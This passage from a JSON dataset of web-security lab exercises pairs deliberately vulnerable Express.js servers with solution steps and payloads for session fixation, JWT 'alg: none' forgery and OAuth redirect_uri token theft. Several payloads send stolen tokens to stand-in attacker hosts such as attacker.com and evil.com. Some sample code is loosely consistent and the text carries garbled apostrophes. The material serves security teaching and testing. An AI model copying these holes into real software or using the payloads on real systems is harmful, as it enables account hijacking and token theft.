      "1. Use Burp Suite to intercept the login request and notice the session ID being reused from a GET parameter (?sid=...)",
      "2. Generate a session ID manually and craft a malicious login URL: /login?sid=attackerSession",
      "3. Send this URL to the victim and wait for them to authenticate using it (assume link click)",
      "4. Monitor /my-account using Burp with sid=attackerSession and check for session elevation",
      "5. Access Carlos\u00e2\u20ac\u2122s account using the fixed session"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const app = express(); const sessions = {}; const users = { carlos: 'supersecret' }; app.use(express.urlencoded({ extended: true })); app.use((req, res, next) => { const sid = req.query.sid || req.cookies?.sid; if (sid) req.sessionID = sid; next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.sessionID] = username; res.send('Logged in!'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { if (sessions[req.sessionID] === 'carlos') res.send('Account: Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('Session Fixation Lab on port 4000'));",
    "payloads": [
      "GET /login?sid=attackerSession",
      "POST /login with body: username=carlos&password=supersecret",
      "GET /my-account?sid=attackerSession"
    ]
  },
  {
    "Lab scenario": "JWT Tampering in GraphQL Authorization Header",
    "Lab Description": "This GraphQL-based API uses JWT for user authentication, but improperly accepts tokens signed with 'alg':'none'. This allows attackers to forge arbitrary tokens. The vulnerable middleware fails to verify the signature when alg=none. To solve: forge an admin JWT and query the adminGraph.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman to send a GraphQL introspection query and discover the 'adminGraph' endpoint.",
      "2. Analyze a valid JWT using jwt.io and note header/payload structure.",
      "3. Forge a new token with 'alg':'none' and 'role':'admin' in payload; remove the signature.",
      "4. Set this token in the Authorization: Bearer header.",
      "5. Send a GraphQL query to { adminGraph { secret } } to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const graphqlHTTP = require('express-graphql'); const schema = require('./schema'); app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; try { req.user = jwt.verify(token, 'hardcoded-secret'); } catch (e) { if (JSON.parse(Buffer.from(token.split('.')[0], 'base64').toString()).alg === 'none') req.user = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); } next(); }); app.use('/graphql', graphqlHTTP((req) => ({ schema, graphiql: true, context: { user: req.user } }))); app.listen(4000, () => console.log('JWT None GraphQL Lab running'));",
    "payloads": [
      "{ \"alg\": \"none\" }.{ \"role\": \"admin\" }.",
      "Authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
      "GraphQL query: { adminGraph { secret } }"
    ]
  },
  {
    "Lab scenario": "OAuth Misconfiguration in Redirect URI Handling",
    "Lab Description": "The application integrates with a third-party OAuth provider but improperly validates the redirect_uri parameter. An attacker can manipulate this parameter to intercept OAuth tokens. The system allows open redirect behavior with a whitelisted domain suffix only. To solve: capture Carlos\u00e2\u20ac\u2122s OAuth code via redirect hijack and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to crawl the /auth endpoint and identify redirect_uri parameter.",
      "2. Send a login URL with redirect_uri=https://attacker.com%23access_token=... (bypassing suffix check via encoded fragment).",
      "3. Host a malicious redirector to log captured tokens.",
      "4. Use captured token to call /oauth-callback and gain access to Carlos\u00e2\u20ac\u2122s account.",
      "5. Visit /my-account with valid session/cookie."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); app.get('/auth', (req, res) => { const redirect_uri = req.query.redirect_uri; if (!redirect_uri.endsWith('trusted.com')) return res.status(400).send('Invalid redirect'); const token = 'carlos-oauth-token'; res.redirect(redirect_uri + '#access_token=' + token); }); app.get('/oauth-callback', (req, res) => { const token = req.query.token; if (token === 'carlos-oauth-token') res.send('Carlos account accessed'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running'));",
    "payloads": [
      "GET /auth?redirect_uri=https://attacker.com%23access_token=carlos-oauth-token",
      "Capture #access_token from attacker.com logs",
      "GET /oauth-callback?token=carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "Session fixation in SAML SSO login flow",
    "Lab Description": "This lab simulates a vulnerable Single Sign-On (SSO) integration using SAML. Due to poor session handling during the pre-authentication phase, attackers can fix a session ID before login. The application reuses the existing session after successful SAML login without regenerating a new session ID. To solve: Hijack Carlos\u00e2\u20ac\u2122s account session using a pre-fixed session ID.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a pre-authenticated GET /sso-init request. Note the Set-Cookie: session ID issued.",
      "2. Log out and forward this session ID to Burp Intruder for future fixation testing.",
      "3. Initiate the SSO flow again but manipulate the session ID manually by injecting your known session cookie.",
      "4. Complete SSO login using your own credentials while ensuring the fixed session ID remains unchanged.",
      "5. Share the fixed session cookie with another browser or curl instance and observe the hijacked post-login session under Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/sso-init', (req, res) => { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('session', sid); res.redirect('/sso-login'); }); app.post('/sso-login', (req, res) => { const sid = req.cookies.session; const user = req.body.user; if (!sid || !sessions[sid]) return res.status(400).send('Invalid session'); sessions[sid].authenticated = true; sessions[sid].user = user; res.send(`Welcome ${user}`); }); const PORT = 4000; app.listen(PORT, () => console.log('SSO Fixation Lab at http://localhost:' + PORT));",
    "payloads": [
      "Set-Cookie: session=fixedSessionID123;",
      "POST /sso-login HTTP/1.1 with Cookie: session=fixedSessionID123 and user=carlos",
      "Reuse fixedSessionID123 in secondary browser"
    ]
  },
  {
    "Lab scenario": "JWT none algorithm authentication bypass",
    "Lab Description": "The application uses JSON Web Tokens (JWTs) for session management. However, the token verification logic does not enforce algorithm validation, allowing an attacker to forge tokens using 'alg: none'. To solve: Forge a valid JWT with admin privileges and access the admin dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite or Postman to intercept a request containing an Authorization: Bearer <JWT> header.",
      "2. Decode the JWT using jwt.io and observe the alg value in the header.",
      "3. Replace 'alg' with 'none' and modify the payload to {\"username\": \"admin\"}.",
      "4. Base64 encode the new header and payload. Remove the signature entirely.",
      "5. Reuse the forged JWT to access the /admin route and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'secret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.username === 'admin') res.send('Welcome admin'); else res.status(403).send('Access denied'); }); const PORT = 4000; app.listen(PORT, () => console.log('JWT None Bypass Lab running at http://localhost:' + PORT));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"admin\" }",
      "Forged JWT: <Base64(header)>.<Base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration leaking authorization code to attacker",
    "Lab Description": "The application uses OAuth for user authentication. It incorrectly allows redirection to arbitrary domains, including those under attacker control. This redirection vulnerability enables the attacker to intercept the authorization code. To solve: Capture Carlos\u00e2\u20ac\u2122s authorization code using a malicious redirect URI and exchange it for an access token.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP to intercept the OAuth authorization request to /auth?client_id=...&redirect_uri=...",
      "2. Modify the redirect_uri parameter to point to a server under your control (e.g., https://evil.com/callback).",
      "3. Send the link to Carlos or wait for him to authenticate via phishing.",
      "4. Capture the code parameter from the redirected request on your server.",
      "5. Exchange the captured code at the /token endpoint to receive an access_token and access the victim\u00e2\u20ac\u2122s profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.urlencoded({ extended: true })); const codes = {}; app.get('/auth', (req, res) => { const { client_id, redirect_uri, state } = req.query; const code = Math.random().toString(36).substring(2); codes[code] = 'carlos'; res.redirect(`${redirect_uri}?code=${code}&state=${state}`); }); app.post('/token', (req, res) => { const { code } = req.body; const user = codes[code]; if (user) res.json({ access_token: 'token-for-' + user }); else res.status(400).send('Invalid code'); }); app.get('/profile', (req, res) => { const { access_token } = req.query; if (access_token === 'token-for-carlos') res.send('Carlos profile data'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab on http://localhost:' + PORT));",
    "payloads": [
      "GET /auth?client_id=app123&redirect_uri=https://evil.com/callback",
      "GET /token with code=<intercepted_code>",
      "GET /profile?access_token=token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation in REST-based login endpoint",
    "Lab Description": "The application's login mechanism is vulnerable to session fixation due to session ID reuse. The application does not regenerate the session ID upon successful login. To solve: Fixate the victim\u00e2\u20ac\u2122s session ID before they log in, then hijack their session and access their profile page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, intercept a GET /login request and observe the session cookie issued before authentication.",
      "2.Send the session cookie to the victim via social engineering or inject it into a URL as a phishing link.",
      "3.After the victim logs in using the fixed session, reuse the same session ID in your browser.",
      "4.Navigate to /profile and confirm access to the victim's authenticated session.",
      "5.Validate exploitation by checking victim\u00e2\u20ac\u2122s profile data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(session({ secret: 'secretKey', resave: false, saveUninitialized: true })); app.use(bodyParser.urlencoded({ extended: true })); const users = [{ username: 'carlos', password: 'password123' }]; app.get('/login', (req, res) => { res.send('Login page - Session ID: ' + req.sessionID); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { req.session.authenticated = true; req.session.username = username; res.send('Logged in successfully'); } else { res.status(401).send('Login failed'); } }); app.get('/profile', (req, res) => { if (req.session.authenticated) { res.send('Welcome ' + req.session.username + ', here is your profile.'); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Phishing URL with session ID: http://vulnerable-app.com/login?PHPSESSID=known_session_id",
      "Browser cookie injection: document.cookie='PHPSESSID=known_session_id'"
    ]
  },
  {
    "Lab scenario": "JWT 'none' algorithm authentication bypass in GraphQL API",
    "Lab Description": "The GraphQL login API accepts JWT tokens with 'none' algorithm and skips signature verification. To solve: Forge a JWT with alg=none to impersonate Carlos and access the /graphql profile query.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Intercept the login request via Postman and observe the Authorization: Bearer <JWT> header after login.",
      "2.Decode the JWT and note the structure and payload.",
      "3.Craft a new JWT with 'alg':'none', 'username':'carlos' and no signature.",
      "4.Use the forged token in the Authorization header to query the profile.",
      "5.Verify profile access for Carlos to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { profile: String }`); const root = { profile: (args, req) => req.user ? `Welcome ${req.user.username}` : 'Unauthorized' }; app.use((req, res, next) => { const auth = req.headers['authorization']; if (auth) { try { const token = auth.split(' ')[1]; req.user = jwt.verify(token, 'secretKey', { algorithms: ['HS256', 'none'] }); } catch (err) { console.log('JWT Error:', err.message); } } next(); }); app.use('/graphql', graphqlHTTP({ schema, rootValue: root, graphiql: true })); app.listen(4001, () => console.log('JWT None Bypass Lab on http://localhost:4001/graphql'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "Final JWT: <base64(header)>.<base64(payload)>."
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via redirect URI in SOAP-based client",
    "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs. This leads to token leakage when attackers inject malicious redirect URIs. To solve: Extract the victim's access token via a crafted OAuth authorization link, then use it to call a SOAP action on behalf of Carlos.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Initiate an OAuth flow and observe the redirect URI behavior in the SOAP client\u00e2\u20ac\u2122s login form.",
      "2.Create a malicious authorization URL with redirect_uri pointing to attacker.com.",
      "3.Trick the victim into clicking the OAuth URL and capture the access token via URL fragment.",
      "4.Use SOAP UI or Postman to call the SOAP getUserDetails action with Authorization: Bearer <token>.",
      "5.Verify that you retrieved Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'abc123': { username: 'carlos' } }; app.get('/oauth/authorize', (req, res) => { const { response_type, client_id, redirect_uri } = req.query; const token = 'abc123'; // hardcoded for demo res.redirect(`${redirect_uri}#access_token=${token}`); }); app.post('/soap', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const user = tokens[token]; if (user) { res.send(`<soap:Envelope><soap:Body><username>${user.username}</username></soap:Body></soap:Envelope>`); } else { res.status(403).send('Invalid token'); } }); app.listen(4002, () => console.log('OAuth Token Leak Lab running on port 4002'));",
    "payloads": [
      "https://auth.example.com/oauth/authorize?response_type=token&client_id=app123&redirect_uri=https://attacker.com",
      "Authorization: Bearer abc123",
      "SOAP Body: <soap:Envelope><soap:Body><getUserDetails/></soap:Body></soap:Envelope>"
    ]
  },
  {
    "Lab scenario": "Session Fixation in GraphQL Login Mutation",
    "Lab Description": "The GraphQL API login endpoint uses a fixed session ID before authentication, allowing session fixation. The application accepts a `sessionid` cookie that is issued before login and preserved after authentication. To solve: Hijack a victim's session by predefining a session ID, tricking them into using it, and authenticating as them.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Using Burp Suite, observe that an unauthenticated POST /graphql mutation returns a `Set-Cookie: sessionid=<random>` before login.",
      "2.Use Burp Repeater to issue a fixed sessionid cookie like `sessionid=attackersession123` and call the login mutation. Notice it stays unchanged after successful login.",
      "3.Share a crafted phishing link to the victim pointing to `https://vulnerable-app/login` with the session cookie pre-set using JavaScript (via reflected XSS or email).",
      "4.After the victim logs in using the pre-set session ID, capture authenticated responses using the same sessionid=attackersession123 in your own requests.",
      "5.Verify you can access /my-account GraphQL query using the fixed session cookie to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 's3cret' }]; const sessions = {}; app.post('/graphql', (req, res) => { const sid = req.cookies.sessionid || Math.random().toString(36).substring(2); if (!sessions[sid]) sessions[sid] = { authenticated: false }; const { query } = req.body; if (query.includes('login')) { const [_, username, password] = query.match(/login\\(username: \"(.*?)\", password: \"(.*?)\"\\)/); const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sid].authenticated = true; res.cookie('sessionid', sid); return res.send({ data: { login: true } }); } } if (query.includes('myAccount') && sessions[sid]?.authenticated) return res.send({ data: { myAccount: 'Carlos Account Data' } }); res.status(403).send({ error: 'Unauthorized' }); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Cookie: sessionid=attackersession123",
      "GraphQL Mutation: mutation { login(username: \"carlos\", password: \"s3cret\") }",
      "GraphQL Query: query { myAccount }"
    ]
  },
  {
    "Lab scenario": "JWT Authentication Bypass via 'none' Algorithm in REST API",
    "Lab Description": "The application uses JWT tokens for user sessions, but fails to validate the `alg` field. The server accepts JWTs with `alg: none`, allowing unsigned tokens. To solve: Forge a JWT token for the user `carlos` and access the protected profile endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Log in as your own user and intercept the POST /login response using Burp Suite. Capture the JWT token from the Set-Cookie header.",
      "2.Decode the JWT using jwt.io and observe the algorithm is `HS256`, but the server doesn't validate it.",
      "3.Craft a new JWT header: { \"alg\": \"none\", \"typ\": \"JWT\" } and payload: { \"username\": \"carlos\" }, then base64 encode them and omit the signature part.",
      "4.Set this forged JWT in the Authorization header as `Bearer <token>`.",
      "5.Send a GET /profile request using Postman with the forged JWT and verify you access Carlos's profile."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const secret = 'supersecretkey'; const users = [{ username: 'carlos', password: 'jwtpass' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { const token = jwt.sign({ username }, secret, { algorithm: 'HS256' }); return res.json({ token }); } res.status(401).send('Invalid'); }); app.get('/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token, { complete: true }); if (decoded.header.alg === 'none') return res.json({ profile: 'Carlos profile data' }); jwt.verify(token, secret); return res.json({ profile: 'Authenticated profile' }); } catch { return res.status(403).send('Forbidden'); } }); app.listen(4000, () => console.log('JWT None Bypass Lab running'));",
    "payloads": [
      "Header: { \"alg\": \"none\", \"typ\": \"JWT\" }",
      "Payload: { \"username\": \"carlos\" }",
      "JWT (Unsigned): base64(header).base64(payload).",
      "Authorization: Bearer <forged_token>"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Misconfiguration in SOAP API",
    "Lab Description": "The app uses an OAuth implicit flow but fails to validate the `aud` (audience) parameter. Attackers can supply their own token intended for a different client ID to gain access. To solve: Forge an access token using a public OAuth tool and access the SOAP profile service.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "1.Use a tool like Postman to initiate an OAuth implicit flow with a public redirect URI.",
      "2.Intercept the access_token returned in the URI fragment. Decode it and observe the `aud` claim allows any string.",
      "3.Replace the token with one containing { \"sub\": \"carlos\", \"aud\": \"evil-client\" }.",
      "4.Send a SOAP request to /soap/profile with Authorization: Bearer <forged_token>.",
      "5.Verify access to Carlos\u00e2\u20ac\u2122s profile data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const bodyParser = require('body-parser'); const xmlparser = require('express-xml-bodyparser'); const jwt = require('jsonwebtoken'); const app = express(); app.use(xmlparser()); app.use(bodyParser.json()); app.post('/soap/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.sub === 'carlos') return res.send(`<Profile><Name>Carlos</Name><Role>Admin</Role></Profile>`); } catch { res.status(403).send('Unauthorized'); } }); app.listen(4000, () => console.log('OAuth Misconfig Lab running on port 4000'));",
    "payloads": [
      "Authorization: Bearer eyJhbGciOiJI... (JWT with sub: 'carlos', aud: 'evil-client')",
      "SOAP Body: <soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"><soapenv:Body><getProfile/></soapenv:Body></soapenv:Envelope>"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in login response headers",
    "Lab Description": "The application issues a session identifier before login and does not regenerate it upon successful authentication. The session ID remains constant, allowing fixation attacks. The application stores sessions using cookies. To solve: hijack Carlos's session by fixing a known session ID and using it after they log in.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Using Burp Suite, visit the login page and observe the Set-Cookie header assigning a session ID before authentication.",
      "2.Send a GET /login request and capture the session ID from the Set-Cookie header.",
      "3.Share this session ID with Carlos and wait until they log in using the fixed session.",
      "4.Once Carlos is logged in, reuse the same session ID in your browser using an interceptor or session editor extension.",
      "5.Access /my-account to verify the session hijack was successful."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; const users = [{ username: 'carlos', password: 'secure123' }]; app.use((req, res, next) => { if (!req.cookies.sessionid) { const sid = Math.random().toString(36).substring(2); sessions[sid] = { authenticated: false }; res.cookie('sessionid', sid); } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; const sid = req.cookies.sessionid; const user = users.find(u => u.username === username && u.password === password); if (user && sid) { sessions[sid].authenticated = true; sessions[sid].user = username; res.send('Welcome back!'); } else { res.status(401).send('Invalid login'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionid; if (sessions[sid]?.authenticated) { res.send('Account for ' + sessions[sid].user); } else { res.status(403).send('Unauthorized'); } }); const PORT = 4000; app.listen(PORT, () => console.log('Session Fixation Lab on http://localhost:' + PORT));",
    "payloads": [
      "Reuse pre-login session cookie after victim authenticates",
      "Manually inject sessionid cookie into browser post-login",
      "Use Burp Cookie Editor to set fixed sessionid"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in implicit grant redirect",
    "Lab Description": "The application uses OAuth 2.0 for third-party authentication but accepts arbitrary redirect URIs without validation. Attackers can hijack tokens using a crafted malicious redirect. To solve: intercept Carlos\u00e2\u20ac\u2122s OAuth token using a poisoned redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Open the login URL that triggers the OAuth flow: /auth?provider=oauth&redirect_uri=https://your-site.com/callback.",
      "2.Intercept the request in Burp and change the redirect_uri to your exploit server URL.",
      "3.Send the request. The authorization code/token will be sent to your exploit server as part of the URI fragment.",
      "4.Copy the access_token from the received request URI.",
      "5.Use Postman to send an authenticated request to /my-account using the stolen Bearer token.",
      "6.Verify successful access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const qs = require('querystring'); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; // No validation! const token = 'access_token_carlos'; const fragment = qs.stringify({ access_token: token, token_type: 'bearer' }); res.redirect(`${redirect_uri}#${fragment}`); }); app.get('/my-account', (req, res) => { const auth = req.headers.authorization; if (auth === 'Bearer access_token_carlos') res.send('Access to Carlos account'); else res.status(403).send('Unauthorized'); }); const PORT = 4000; app.listen(PORT, () => console.log('OAuth Misconfig Lab running at http://localhost:' + PORT));",
    "payloads": [
      "Change redirect_uri to your exploit server in OAuth GET request",
      "Capture access_token from URI fragment on exploit server",
      "Use Bearer access_token_carlos to access /my-account"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Cookie Injection in REST API",
    "Lab Description": "This lab demonstrates a session fixation vulnerability in a RESTful login system. The backend accepts user-supplied session tokens without regenerating them after authentication. The application reflects session tokens provided in requests, and fails to assign a new one on login. To solve: fixate Carlos\u00e2\u20ac\u2122s session, then access his account using the pre-established session.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept a POST /login request and observe that the server reflects the session cookie in the response.",
      "Send a crafted request using Burp Repeater with a known session ID, such as `X-Session-ID: fixed123`, before login.",
      "Observe that after login, the server accepts the supplied session ID and uses it for authenticated state.",
      "Have the victim (Carlos) log in with a fixated session by tricking them to reuse the injected session ID (e.g., through an email link).",
      "Use the same session ID to access GET /account-details with `X-Session-ID: fixed123` and confirm access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'secret123' }]; const sessions = {}; app.post('/login', (req, res) => { const { username, password } = req.body; const sessionId = req.headers['x-session-id'] || Math.random().toString(36).substring(2); const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(403).send('Invalid credentials'); sessions[sessionId] = username; res.setHeader('Set-Cookie', 'X-Session-ID=' + sessionId); res.send({ message: 'Logged in' }); }); app.get('/account-details', (req, res) => { const sessionId = req.headers['x-session-id']; if (!sessions[sessionId]) return res.status(401).send('Not logged in'); res.send('Account details for ' + sessions[sessionId]); }); app.listen(4000, () => console.log('Session Fixation Lab running'));",
    "payloads": [
      "X-Session-ID: fixed123",
      "POST /login { \"username\": \"carlos\", \"password\": \"secret123\" } + Header: X-Session-ID: fixed123",
      "GET /account-details + Header: X-Session-ID: fixed123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Tampering in GraphQL API",
    "Lab Description": "This lab exposes a JWT tampering flaw via the 'none' algorithm in a GraphQL-based authentication endpoint. The JWT is accepted without signature verification when alg=none is used. To solve: Forge a JWT token as 'admin' and access the sensitive adminGraph endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to login and inspect the Authorization: Bearer token used in GraphQL requests.",
      "Decode the JWT using jwt.io and observe it uses RS256 algorithm.",
      "Craft a new token with `\"alg\": \"none\"` and change `\"username\": \"admin\"`.",
      "Remove the JWT signature section (third part of the token) and send this forged token in Authorization header.",
      "Use GraphQL introspection or replay to access `query { adminGraph { flag } }` and validate access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { adminGraph: String }`); const root = { adminGraph: (args, context) => { if (context.user !== 'admin') throw new Error('Unauthorized'); return 'FLAG-9f84bfa'; } }; app.use('/graphql', (req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; let payload; try { payload = jwt.verify(token, 'PRIVATE_KEY', { algorithms: ['RS256', 'none'] }); } catch (err) { return res.status(401).send('Invalid token'); } req.user = payload.username; next(); }, graphqlHTTP((req) => ({ schema, rootValue: root, context: { user: req.user }, graphiql: false }))); app.listen(4001, () => console.log('JWT None Lab running'));",
    "payloads": [
      "JWT header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "JWT payload: {\"username\":\"admin\"}",
      "Authorization: Bearer <base64(header)>.base64(payload).",
      "GraphQL Query: { adminGraph { flag } }"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Leak via Redirect Manipulation in SOAP Endpoint",
    "Lab Description": "The application uses OAuth implicit flow and allows arbitrary redirect URIs, exposing access tokens via fragment identifiers to untrusted domains. The SOAP authentication callback endpoint reflects redirect URLs without validation. To solve: Capture Carlos's access token by crafting a malicious redirect URI.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to analyze the /oauth/callback SOAP endpoint and observe it reflects `redirect_uri` unsanitized.",
      "Craft an authorization URL with `redirect_uri=https://evil.com#access_token=...` and send it to Carlos.",
      "Host a listener on evil.com and monitor traffic.",
      "When Carlos clicks the link and logs in, the access_token is leaked via the fragment to the attacker domain.",
      "Replay the token in Authorization: Bearer to access protected resources as Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const soap = require('soap'); const app = express(); app.get('/oauth/callback', (req, res) => { const redirectUri = req.query.redirect_uri; const accessToken = 'token-for-carlos'; res.send(`<script>window.location='${redirectUri}#access_token=${accessToken}'</script>`); }); app.listen(4002, () => console.log('OAuth Redirect Lab running'));",
    "payloads": [
      "https://vulnerable-site.com/oauth/authorize?client_id=xyz&response_type=token&redirect_uri=https://evil.com",
      "Leaked URL: https://evil.com#access_token=token-for-carlos",
      "Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Reused Auth Token in SOAP API",
    "Lab Description": "The application's SOAP-based login system fails to issue new session identifiers upon re-authentication. The application retains the initial session ID for subsequent logins. To solve: exploit session fixation to gain access to the victim's session by tricking them into logging in with a fixed session identifier.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept SOAP request with Burp Suite and capture the session cookie assigned on initial request.",
      "Observe the response structure and note that the session cookie remains unchanged across logins.",
      "Craft a SOAP login payload with victim credentials and replay it while maintaining the same session cookie.",
      "Send phishing link or script to the victim embedding the fixed session cookie in a browser session.",
      "After victim logs in, reuse the fixed session cookie to access their authenticated session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.text({ type: 'application/soap+xml' })); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'letmein' }]; app.post('/soap-auth', (req, res) => { const sessionId = req.cookies.sessionid || Math.random().toString(36).substring(2); const creds = req.body.match(/<username>(.*?)<\\/username>.*?<password>(.*?)<\\/password>/); const [_, username, password] = creds; const user = users.find(u => u.username === username && u.password === password); if (user) { res.setHeader('Set-Cookie', `sessionid=${sessionId}; HttpOnly`); res.send(`<response><message>Login successful</message></response>`); } else { res.status(403).send(`<response><message>Unauthorized</message></response>`); } }); app.get('/my-account', (req, res) => { if (req.cookies.sessionid === 'fixsession123') return res.send('Account: carlos'); res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('SOAP Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "<soap><username>carlos</username><password>letmein</password></soap>",
      "Set-Cookie: sessionid=fixsession123",
      "GET /my-account with sessionid=fixsession123"
    ]
  },
  {
    "Lab scenario": "JWT Signature Confusion in Authorization Header",
    "Lab Description": "The application uses a JWKS endpoint to validate JWTs but does not validate the 'kid' field properly. This allows attackers to supply a custom public key and forge tokens. To solve: forge an admin token by injecting a manipulated 'kid' field and supplying your own matching public key.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to inspect JWT in the Authorization header and extract its structure.",
      "Send a forged token with a 'kid' referencing a custom key you control, using Burp Repeater.",
      "Host a malicious JWKS endpoint serving your public key under the specified 'kid'.",
      "Modify the payload to escalate privileges to admin and re-sign the token.",
      "Use the forged JWT to access the admin-only endpoint."
    ],
    "Vulnerability name": "Authentication",
